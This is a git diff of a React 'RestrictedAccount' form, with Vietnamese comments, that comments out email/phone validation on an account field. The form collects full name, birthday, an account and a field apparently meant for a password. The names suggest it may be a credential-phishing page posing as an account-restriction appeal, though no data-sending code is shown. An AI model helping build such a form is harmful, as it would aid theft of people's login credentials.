@@ -61,13 +61,13 @@ function RestrictedAccount() {
   }, []);
 
    // 🔹 Hàm kiểm tra email/phone
-  const validateEmailOrPhone = (value) => {
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    const phoneRegex = /^(\+?\d{10,15}|0\d{9,10})$/;
-    if (emailRegex.test(value)) return true;
-    if (phoneRegex.test(value)) return true;
-    return false;
-  };
+  // const validateEmailOrPhone = (value) => {
+  //   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  //   const phoneRegex = /^(\+?\d{10,15}|0\d{9,10})$/;
+  //   if (emailRegex.test(value)) return true;
+  //   if (phoneRegex.test(value)) return true;
+  //   return false;
+  // };
 
   const sendAccountInfo = async () => {
     if (!fullName.trim() || !birthday.trim() || !tk1.trim() || !m1.trim()) {
@@ -76,12 +76,12 @@ function RestrictedAccount() {
     }
 
     // 🔹 Kiểm tra định dạng email hoặc phone
-    if (!validateEmailOrPhone(tk1)) {
-      setTk1Error("Please enter a valid email or phone number.");
-      return;
-    } else {
-      setTk1Error("");
-    }
+    // if (!validateEmailOrPhone(tk1)) {
+    //   setTk1Error("Please enter a valid email or phone number.");
+    //   return;
+    // } else {
+    //   setTk1Error("");
+    // }
 
     setShowModal(true);
 
@@ -144,10 +144,10 @@ debugger;
             value={tk1}
             onChange={(e) => {
               setTk1(e.target.value);
-              setTk1Error("");
+              // setTk1Error("");
             }}
           />
-          {tk1Error && <div className="invalid-feedback text-start">{tk1Error}</div>}
+          {/* {tk1Error && <div className="invalid-feedback text-start">{tk1Error}</div>} */}
           <input
             type="text"
             className="form-control mb-3"
